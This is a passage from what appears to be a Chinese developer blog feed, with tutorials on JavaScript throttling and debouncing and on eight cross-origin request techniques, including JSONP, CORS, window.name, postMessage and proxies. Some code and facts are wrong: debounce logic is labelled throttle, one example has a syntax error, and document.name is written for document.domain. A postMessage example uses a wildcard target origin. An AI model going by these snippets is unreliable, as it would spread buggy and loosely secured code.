      <url>/2018/08/14/%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81%E4%B8%8E%E5%87%BD%E6%95%B0%E9%98%B2%E6%8A%96/</url>
      
        <content type="html"><![CDATA[<p>有些浏览器事件会被用户在很短的时间内触发很多次，例如点击事件或滚动页面。如果你给窗口滚动事件添加一个事件监听函数（事件句柄），然后用户不停地快速上下滚动页面，那你的事件可能在一秒之内都会被触发很多次，这会导致严重的性能问题，比如说你的页面卡住了（假死），所以我们需要降低触发回调的频率。<br>下面就说一下优化这种高频执行js的方法，来提高页面速度和性能。</p><h2 id="Throttling-节流"><a href="#Throttling-节流" class="headerlink" title="Throttling(节流)"></a>Throttling(节流)</h2><p>相信很多人都用过两个事件：onresize跟onscroll，这两个事件一个在页面放大缩小时触发一个在页面滚动时触发，一般情况下伴随着这两个事件的肯定是DOM节点的定位啊，scrollTop距离的检测啊之类的操作，回到最初的问题，都说了DOM操作是很昂贵的你还在每一次onresize跟onscroll事件触发的时候去执行DOM操作，浪费机器性能很好玩么！</p><p>既然发现了问题，那么就要解决问题，解决的办法就是函数节流。函数节流背后的思想很简单：因为onresize跟onscroll这类事件是连续不断的触发的，那么在每次触发的时候我们就开一个定时器，将DOM操作延迟，然后在下一次事件触发的时候，我们把这个定时器给关掉，这样的结果就是onresize事件一路触发的时候，我们开定时器，关定时器，开定时器，关定时器。。。一直等到最后你不执行onresize的操作了，再等待延迟的时间后，最后这个没有被关闭的定时器开始执行回调函数，访问DOM节点。</p><p>对于函数节流，有两种实现的方法：<br>预先设定一个执行周期，当调用动作的时刻大于等于执行周期则执行该动作，然后进入下一个新的时间周期。(设置阈值)<br>1.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> throttle(method , context)&#123;<br>    clearTimeout(method.tId);<br><br>    method.tId=setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        method.call(context);<br>    &#125;,500);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>2.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> throttle(method , delay)&#123;<br>    var timer=null;<br><br>    <span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        var context = this, <br>            args = arguments;<br>        clearTimeout(timer);<br><br>        timer = setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            method.apply(context , args);<br>        &#125; , delay);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">var canRun = <span class="hljs-literal">true</span>;<br>document.getElementById(<span class="hljs-string">"throttle"</span>).onscroll = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br> <span class="hljs-keyword">if</span>(!canRun)&#123;<br> // 判断是否已空闲，如果在执行中，则直接<span class="hljs-built_in">return</span><br> <span class="hljs-built_in">return</span>;<br> &#125;<br> canRun = <span class="hljs-literal">false</span>;<br> setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br> console.log(<span class="hljs-string">"函数节流"</span>);<br> canRun = <span class="hljs-literal">true</span>;<br> &#125;, 300);<br>&#125;;<br></code></pre></td></tr></table></figure></p><h2 id="Debouncing-防抖"><a href="#Debouncing-防抖" class="headerlink" title="Debouncing(防抖)"></a>Debouncing(防抖)</h2><p>它的做法是限制下次函数调用之前必须等待的时间间隔。<br>函数节流是一个很好用的方案，但假如我并不希望每次都是要事件结束后等待delay的事件后才执行回调，但是又希望减少DOM操作，那该如何处理呢？</p><p>我们先给定一个时间段duration，过了这个时间段以后我们执行相应的操作，如果没有过这个时间段，那么就按照函数节流的思路，开关定时器就行了~<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> throttle(method , duration ，delay )&#123;<br>    var timer = null, <br>        // 记录下开始执行函数的时间<br>        begin = new Date();<br><br>    <span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        var context = this, <br>            args = arguments, <br>            // 记录下当前时间<br>            current = new Date();<br>        // 函数节流里的思路<br>        clearTimeout(timer);<br><br>        // 记录下的两个时间相减再与duration进行比较<br>        <span class="hljs-keyword">if</span>(current-begin &gt;= duration)&#123;<br>             method.apply(context , args);<br>             begin = current;<br>        &#125;<span class="hljs-keyword">else</span>&#123;  <br>            timer = setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>                method.apply(context , args);<br>            &#125; , delay);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">var timer = <span class="hljs-literal">false</span>;<br>document.getElementById(<span class="hljs-string">"debounce"</span>).onscroll = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br> clearTimeout(timer); // 清除未执行的代码，重置回初始化状态<br> timer = setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br> console.log(<span class="hljs-string">"函数防抖"</span>);<br> &#125;, 300);<br>&#125;;<br></code></pre></td></tr></table></figure><p>如果方法多次触发，则把上次记录的延迟执行代码用clearTimeout清掉，重新开始。函数防抖的实现重点，就是巧用setTimeout做缓存池，而且可以轻易地清除待执行的代码。关于清除上次未执行setTimeout：<br>　　setTimeout()函数将返回一个标识符 ID，这个 ID 是唯一的(一般是整数，从1开始，每调用一次 setTimeout() 就加1)。如果需要 setTimeout() 执行的函数或代码尚未执行，我们可以通过 clearTimeout() 函数来取消该执行操作，clearTimeout() 函数需要接收一个参数，这个参数就是 setTimeout() 函数返回的标识符ID。<br>　　当调用动作触发一段时间后，才会执行该动作，若在这段时间间隔内又调用此动作则将重新计算时间间隔。把触发非常频繁的事件合并成一次执行。</p><h2 id="throttle应用场景"><a href="#throttle应用场景" class="headerlink" title="throttle应用场景"></a>throttle应用场景</h2><p>DOM 元素的拖拽功能实现（mousemove）<br>射击游戏的 mousedown/keydown 事件（单位时间只能发射一颗子弹）<br>计算鼠标移动的距离（mousemove）<br>Canvas 模拟画板功能（mousemove）<br>搜索联想（keyup）<br>监听滚动事件判断是否到页面底部自动加载更多：给 scroll 加了 debounce 后，只有用户停止滚动后，才会判断是否到了页面底部；如果是 throttle 的话，只要页面滚动就会间隔一段时间判断一次</p><h2 id="debounce应用场景"><a href="#debounce应用场景" class="headerlink" title="debounce应用场景"></a>debounce应用场景</h2><p>函数去抖有哪些应用场景？哪些时候对于连续的事件响应我们只需要执行一次回调？</p><p>每次 resize/scroll 触发统计事件<br>文本输入的验证（连续输入文字后发送 AJAX 请求进行验证，验证一次就好）</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8种方式实现跨域请求</title>
      <link href="/2018/08/13/8%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
      <url>/2018/08/13/8%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<h2 id="浏览器的同源策略"><a href="#浏览器的同源策略" class="headerlink" title="浏览器的同源策略"></a>浏览器的同源策略</h2><p>​何为同源？只有当 <strong>协议</strong> 、<strong>端口</strong> 、和 <strong>域名</strong> 都相同的页面，则两个页面具有相同的源。只要网站的 协议名protocol、 主机host、 端口号port 这三个中的任意一个不同，网站间的数据请求与传输便构成了跨域调用，会受到同源策略的限制。<br>​ 同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。浏览器的同源策略，出于防范跨站脚本的攻击，禁止客户端脚本（如 JavaScript）对不同域的服务进行跨站调用（通常指使用XMLHttpRequest请求）。</p><h2 id="跨域请求方式"><a href="#跨域请求方式" class="headerlink" title="跨域请求方式"></a>跨域请求方式</h2><p>解决跨域问题，最简单的莫过于通过 <strong>nginx</strong> 反向代理进行实现，但是其需要在运维层面修改，且有可能请求的资源并不再我们控制范围内（第三方），所以该方式不能作为通用的解决方案，下面阐述了经常用到几种跨域方式：</p><h2 id="方式一：图片或script标签跨域"><a href="#方式一：图片或script标签跨域" class="headerlink" title="方式一：图片或script标签跨域"></a>方式一：图片或script标签跨域</h2><p><strong>图片ping</strong>常用于跟踪用户点击页面或动态广告曝光次数。<br><strong>script标签</strong>可以得到从其他来源数据，这也是JSONP依赖的根据。<br><strong>缺点</strong>：只能发送Get请求 ，无法访问服务器的响应文本（单向请求）</p><h2 id="方式二：JSONP跨域"><a href="#方式二：JSONP跨域" class="headerlink" title="方式二：JSONP跨域"></a>方式二：JSONP跨域</h2><p> JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script>元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。<br> <img src="https://img-blog.csdn.net/20170611224721413?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbGlnYW5nMjU4NTExNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt><br> <strong>缺点</strong></p><ul><li>只能使用Get请求</li><li>不能注册success、error等事件监听函数，不能很容易的确定JSONP请求是否失败</li><li>JSONP是从其他域中加载代码执行，容易受到跨站请求伪造的攻击，其安全性无法确保</li></ul><p>代码实现：<br>1.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span> src=<span class="hljs-string">"https://code.jquery.com/jquery-3.1.0.min.js"</span>&gt;&lt;/script&gt;<br>&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;<br>$(<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>$.ajax(&#123;<br>async: <span class="hljs-literal">true</span>,<br>url: <span class="hljs-string">"https://api.douban.com/v2/book/search"</span>,<br><span class="hljs-built_in">type</span>: <span class="hljs-string">"GET"</span>,<br>dataType: <span class="hljs-string">"jsonp"</span>, // 返回的数据类型，设置为JSONP方式<br>jsonp: <span class="hljs-string">'callback'</span>, //指定一个查询参数名称来覆盖默认的 jsonp 回调参数名 callback<br>jsonpCallback: <span class="hljs-string">'handleResponse'</span>, //设置回调函数名<br>data: &#123;<br>q: <span class="hljs-string">"javascript"</span>,<br>count: 1<br>&#125;,<br>success: <span class="hljs-keyword">function</span>(response, status, xhr) &#123;<br>console.log(<span class="hljs-string">'状态为：'</span> + status + <span class="hljs-string">',状态是：'</span> + xhr.statusText);<br>console.log(response);<br>&#125;<br>&#125;);<br>&#125;);    <br><br><br>$.getJSON(<span class="hljs-string">"https://api.douban.com/v2/book/search?callback=?"</span>,&#123;q:<span class="hljs-string">"javascript"</span>,count:1&#125;,<span class="hljs-keyword">function</span>(data)&#123;<br>console.log(data);<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>2.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span> src=<span class="hljs-string">"js/jquery-1.11.1.js"</span>&gt;&lt;/script&gt;<br>&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;<br>var url = <span class="hljs-string">"http://localhost:8080/html5/jsonp_data.js"</span>;<br>// 创建script标签，设置其属性<br>var script = document.createElement(<span class="hljs-string">'script'</span>);<br>script.setAttribute(<span class="hljs-string">'src'</span>, url);<br>// 把script标签加入head，此时调用开始<br>document.getElementsByTagName(<span class="hljs-string">'head'</span>)[0].appendChild(script);<br><span class="hljs-keyword">function</span> callbackFun(data)<br>&#123;<br>    console.log(data.age);<br>    console.log(data.name);<br>&#125;  <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><h2 id="方式三：CORS"><a href="#方式三：CORS" class="headerlink" title="方式三：CORS"></a>方式三：CORS</h2><p>​ Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。服务器一般需要增加如下响应头的一种或几种：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Access-Control-Allow-Origin: *<br>Access-Control-Allow-Methods: POST, GET, OPTIONS<br>Access-Control-Allow-Headers: X-PINGOTHER, Content-Type<br>Access-Control-Max-Age: 86400<br></code></pre></td></tr></table></figure></p><p>跨域请求默认不会携带Cookie信息，如果需要携带请配置下属参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">"Access-Control-Allow-Credentials"</span>: <span class="hljs-literal">true</span><br>// Ajax设置<br><span class="hljs-string">"withCredentials"</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></p><h2 id="方式四-window-name-iframe"><a href="#方式四-window-name-iframe" class="headerlink" title="方式四:window.name+iframe"></a>方式四:window.name+iframe</h2><p>​ window.name通过在iframe（一般动态创建i）中加载跨域HTML文件来起作用。然后，HTML文件将传递给请求者的字符串内容赋值给window.name。然后，请求者可以检索window.name值作为响应。</p><ul><li>iframe标签的跨域能力；</li><li>window.name属性值在文档刷新后依旧存在的能力（且最大允许2M左右）。<br>每个iframe都有包裹它的window，而这个window是top window的子窗口。contentWindow属性返回&lt;iframe>元素的Window对象。你可以使用这个Window对象来访问iframe的文档及其内部DOM。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- <br> 下述用端口 <br> 10000表示：domainA<br> 10001表示：domainB<br>--&gt;<br><br>&lt;!-- localhost:10000 --&gt;<br>&lt;script&gt;<br>  var iframe = document.createElement(<span class="hljs-string">'iframe'</span>);<br>  iframe.style.display = <span class="hljs-string">'none'</span>; // 隐藏<br><br>  var state = 0; // 防止页面无限刷新<br>  iframe.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>      <span class="hljs-keyword">if</span>(state === 1) &#123;<br>          console.log(JSON.parse(iframe.contentWindow.name));<br>          // 清除创建的iframe<br>          iframe.contentWindow.document.write(<span class="hljs-string">''</span>);<br>          iframe.contentWindow.close();<br>          document.body.removeChild(iframe);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(state === 0) &#123;<br>          state = 1;<br>          // 加载完成，指向当前域，防止错误(proxy.html为空白页面)<br>          // Blocked a frame with origin <span class="hljs-string">"http://localhost:10000"</span> from accessing a cross-origin frame.<br>          iframe.contentWindow.location = <span class="hljs-string">'http://localhost:10000/proxy.html'</span>;<br>      &#125;<br>  &#125;;<br><br>  iframe.src = <span class="hljs-string">'http://localhost:10001'</span>;<br>  document.body.appendChild(iframe);<br>&lt;/script&gt;<br><br>&lt;!-- localhost:10001 --&gt;<br>&lt;!DOCTYPE html&gt;<br>...<br>&lt;script&gt;<br>  window.name = JSON.stringify(&#123;a: 1, b: 2&#125;);<br>&lt;/script&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><strong>注意</strong><br>直接嵌入其他域（localhots:10001）下的URL会报错，所以需要加载完成替换为当前域的URL(localhots:10000)，proxy.html为空白页面，只为解决该问题；<br><img src="https://img-blog.csdn.net/20170611224841482?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbGlnYW5nMjU4NTExNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt><br>跨域请求iframe<br>重新设置src（<a href="http://localhost:10000/proxy.html）后导致页面不断刷新，所以通过state来控制；" target="_blank" rel="noopener">http://localhost:10000/proxy.html）后导致页面不断刷新，所以通过state来控制；</a><br>全部获取完结果后，清除该iframe。</p><h2 id="方式五：window-postMessage"><a href="#方式五：window-postMessage" class="headerlink" title="方式五：window.postMessage()"></a>方式五：window.postMessage()</h2><p>HTML5新特性，可以用来向其他所有的 window 对象发送消息。需要注意的是我们必须要保证所有的脚本执行完才发送 MessageEvent，如果在函数执行的过程中调用了它，就会让后面的函数超时无法执行。<br><strong>下述代码实现了跨域存储localStorage</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- <br> 下述用端口 <br> 10000表示：domainA<br> 10001表示：domainB<br>--&gt;<br><br>&lt;!-- localhost:10000 --&gt;<br>&lt;iframe src=<span class="hljs-string">"http://localhost:10001/msg.html"</span> name=<span class="hljs-string">"myPostMessage"</span> style=<span class="hljs-string">"display:none;"</span>&gt;<br>&lt;/iframe&gt;<br><br>&lt;script&gt;<br>  <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>      LSsetItem(<span class="hljs-string">'test'</span>, <span class="hljs-string">'Test: '</span> + new Date());<br>      LSgetItem(<span class="hljs-string">'test'</span>, <span class="hljs-keyword">function</span>(value) &#123;<br>          console.log(<span class="hljs-string">'value: '</span> + value);<br>      &#125;);<br>      LSremoveItem(<span class="hljs-string">'test'</span>);<br>  &#125;<br><br>  var callbacks = &#123;&#125;;<br>  window.addEventListener(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">function</span>(event) &#123;<br>      <span class="hljs-keyword">if</span> (event.source === frames[<span class="hljs-string">'myPostMessage'</span>]) &#123;<br>          console.log(event)<br>          var data = /^<span class="hljs-comment">#localStorage#(\d+)(null)?#([\S\s]*)/.exec(event.data);</span><br>          <span class="hljs-keyword">if</span> (data) &#123;<br>              <span class="hljs-keyword">if</span> (callbacks[data[1]]) &#123;<br>                  callbacks[data[1]](data[2] === <span class="hljs-string">'null'</span> ? null : data[3]);<br>              &#125;<br>              delete callbacks[data[1]];<br>          &#125;<br>      &#125;<br>  &#125;, <span class="hljs-literal">false</span>);<br><br>  var domain = <span class="hljs-string">'*'</span>;<br>  // 增加<br>  <span class="hljs-keyword">function</span> LSsetItem(key, value) &#123;<br>      var obj = &#123;<br>          setItem: key,<br>          value: value<br>      &#125;;<br>      frames[<span class="hljs-string">'myPostMessage'</span>].postMessage(JSON.stringify(obj), domain);<br>  &#125;<br>  // 获取<br>  <span class="hljs-keyword">function</span> LSgetItem(key, callback) &#123;<br>      var identifier = new Date().getTime();<br>      var obj = &#123;<br>          identifier: identifier,<br>          getItem: key<br>      &#125;;<br>      callbacks[identifier] = callback;<br>      frames[<span class="hljs-string">'myPostMessage'</span>].postMessage(JSON.stringify(obj), domain);<br>  &#125;<br>  // 删除<br>  <span class="hljs-keyword">function</span> LSremoveItem(key) &#123;<br>      var obj = &#123;<br>          removeItem: key<br>      &#125;;<br>      frames[<span class="hljs-string">'myPostMessage'</span>].postMessage(JSON.stringify(obj), domain);<br>  &#125;<br>&lt;/script&gt;<br><br>&lt;!-- localhost:10001 --&gt;<br>&lt;script&gt;<br>  window.addEventListener(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">function</span>(event) &#123;<br>    console.log(<span class="hljs-string">'Receiver debugging'</span>, event);<br>    <span class="hljs-keyword">if</span> (event.origin == <span class="hljs-string">'http://localhost:10000'</span>) &#123;<br>      var data = JSON.parse(event.data);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">'setItem'</span> <span class="hljs-keyword">in</span> data) &#123;<br>        localStorage.setItem(data.setItem, data.value);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">'getItem'</span> <span class="hljs-keyword">in</span> data) &#123;<br>        var gotItem = localStorage.getItem(data.getItem);<br>        event.source.postMessage(<br>          <span class="hljs-string">'#localStorage#'</span> + data.identifier +<br>          (gotItem === null ? <span class="hljs-string">'null#'</span> : <span class="hljs-string">'#'</span> + gotItem),<br>          event.origin<br>        );<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">'removeItem'</span> <span class="hljs-keyword">in</span> data) &#123;<br>        localStorage.removeItem(data.removeItem);<br>      &#125;<br>    &#125;<br>  &#125;, <span class="hljs-literal">false</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p><strong>Safari下会报错</strong></p><blockquote><p>Blocked a frame with origin “<a href="http://localhost:10001”" target="_blank" rel="noopener">http://localhost:10001”</a> from accessing a frame with origin “<a href="http://localhost:10000“" target="_blank" rel="noopener">http://localhost:10000“</a>. Protocols, domains, and ports must match.</p></blockquote><p>避免该错误，可以在Safari浏览器中勾选开发菜单==&gt;停用跨域限制。或者只能使用服务器端转存的方式实现，因为Safari浏览器默认只支持CORS跨域请求。</p><h2 id="方式六：修改document-domain跨子域"><a href="#方式六：修改document-domain跨子域" class="headerlink" title="方式六：修改document.domain跨子域"></a>方式六：修改document.domain跨子域</h2><p>前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用document.domain进行跨域，所以只能跨子域<br>​ 在根域范围内，允许把domain属性的值设置为它的上一级域。例如，在”aaa.xxx.com”域内，可以把domain设置为 “xxx.com” 但不能设置为 “xxx.org” 或者”com”。</p><blockquote><p>现在存在两个域名aaa.xxx.com和bbb.xxx.com。在aaa下嵌入bbb的页面，由于其document.name不一致，无法在aaa下操作bbb的js。可以在aaa和bbb下通过js将document.name = ‘xxx.com’;设置一致，来达到互相访问的作用。</p></blockquote><h2 id="方式七：WebSocket"><a href="#方式七：WebSocket" class="headerlink" title="方式七：WebSocket"></a>方式七：WebSocket</h2><p>WebSocket protocol 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很棒的实现。相关文章，请查看：<a href="https://blog.csdn.net/ligang2585116/article/details/47259301" target="_blank" rel="noopener">WebSocket</a>、<a href="https://blog.csdn.net/ligang2585116/article/details/47277917" target="_blank" rel="noopener">WebSocket-SockJS</a></p><p><strong>需要注意：</strong>WebSocket对象不支持DOM 2级事件侦听器，必须使用DOM 0级语法分别定义各个事件。</p><h2 id="方式八：代理"><a href="#方式八：代理" class="headerlink" title="方式八：代理"></a>方式八：代理</h2><p>同源策略是针对浏览器端进行的限制，可以通过服务器端来解决该问题</p><p>DomainA客户端（浏览器） ==&gt; DomainA服务器 ==&gt; DomainB服务器 ==&gt; DomainA客户端（浏览器）<br>实现HTTP，HTTPS代理请参照：<a href="https://blog.csdn.net/ligang2585116/article/details/72827781" target="_blank" rel="noopener">创建HTTP与HTTPS服务器与客户端</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js严格模式与非严格模式</title>
      <link href="/2018/08/04/js%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E4%B8%8E%E9%9D%9E%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/08/04/js%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E4%B8%8E%E9%9D%9E%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</url>
      
